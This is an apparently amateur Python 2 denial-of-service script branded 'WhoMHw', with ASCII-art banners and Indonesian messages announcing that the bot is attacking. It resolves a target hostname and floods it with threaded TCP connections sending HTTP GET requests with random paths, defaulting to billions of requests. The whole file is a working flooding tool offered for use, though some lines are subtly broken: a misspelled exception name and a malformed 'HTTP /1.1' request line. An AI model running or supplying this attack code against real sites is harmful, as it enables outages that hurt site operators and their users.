
import sys
import time
import string 
import random 
import os 
import threading
import socket


# parse input 

host = " "
ip = " "
port = 0
num_request = 0

if len(sys.argv) == 2:
   port = 80
   num_request = 100000000000
elif len(sys.argv) == 3:
    port = int(sys.argv[2])
    num_request = 10000000000
elif len (sys.argv) == 4:
    port = int(sys.argv[2])
    num_request = int(sys.argv[3])
else:
    print "eror om\n"
    print '=============='
    print '=  WhoMHw    ='
    print '= Wong Biasa ='
    print '=============='
    print  '@@@@@@@   @@@@@@@    @@@@@@    @@@@@@'
    print  '@@@@@@@@  @@@@@@@@  @@@@@@@@  @@@@@@@'  
    print  '@@!  @@@  @@!  @@@  @@!  @@@  !@@    '  
    print  '!@!  @!@  !@!  @!@  !@!  @!@  !@!    '   
    print  '@!@  !@!  @!@  !@!  @!@  !@!  !!@@!!  '   
    print  '!@!  !!!  !@!  !!!  !@!  !!!   !!@!!!   '
    print  '!!:  !!!  !!:  !!!  !!:  !!!       !:!  '
    print  ':!:  !:!  :!:  !:!  :!:  !:!      !:!   '
    print  ' :::: ::   :::: ::  ::::: ::  :::: ::   '
    print  ':: :  :   :: :  :    : :  :   :: : :\n '  "Gunakan: " + sys.argv[0] + "< Hostname > < Port >< jumlah serangan >"




    sys.exit(1)  
try:
    host = str(sys.argv[1]).replace("https://", " ").replace("http://"," ").replace("www.", " ")
    ip = socket.gethostbyname(host)
except socket.gaierror:
    print '=============='
    print '=  WhoMHw    ='
    print '= Wong Biasa ='
    print '=============='
    print  '@@@@@@@   @@@@@@@    @@@@@@    @@@@@@'
    print  '@@@@@@@@  @@@@@@@@  @@@@@@@@  @@@@@@@'  
    print  '@@!  @@@  @@!  @@@  @@!  @@@  !@@    '  
    print  '!@!  @!@  !@!  @!@  !@!  @!@  !@!    '   
    print  '@!@  !@!  @!@  !@!  @!@  !@!  !!@@!!  '   
    print  '!@!  !!!  !@!  !!!  !@!  !!!   !!@!!!   '
    print  '!!:  !!!  !!:  !!!  !!:  !!!       !:!  '
    print  ':!:  !:!  :!:  !:!  :!:  !:!      !:!   '
    print  ' :::: ::   :::: ::  ::::: ::  :::: ::   '
    print  ':: :  :   :: :  :    : :  :   :: : : '
    print  'Masukan dengan Benar/WEB tidak ada'

    sys.exit(2)


thread_num = 0
thread_num_mutex = threading.Lock()

        

def print_status():
    global thread_num
    thread_num_mutex.acquire(True)

    thread_num += 1
    print "\n " + time.ctime().split(" ")[3] + " " + "[" + str(thread_num) + "] #.#.# BoT WhoMHw sedang menyerang#.#.#."
    
    thread_num_mutex.release()




def generate_url_path():
    msg = str(string.letters + string.digits + string.punctuation)
    data = " ".join(random.sample(msg,5))
    return data

def attack():
    print_status()
    url_path = generate_url_path()

    dos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        dos.connect((ip, port))

        dos.send("GET /%s HTTP /1.1\nHOST: %s\n\n" % (url_path, host))
    except socket.eror, e:
        print "\N [TIDAK ADA KONEKSI ATAU BOT MHw SUDAH BERHASIL]: " + str(e)
    finally:
        dos.shutdown(socket.SHUT_RDWR)
        dos.close()

print "[ON] Attack Started on " + host + " (" + ip + ") || Port: " + str(port) + " || #Requests: " + str(num_request)

all_threads = []  

for i in xrange(num_request):
    t1 = threading.Thread(target=attack)
    t1.start()
    all_threads.append(t1)

    time.sleep(0.01)

for current_thread in all_threads:
    current_thread.join()
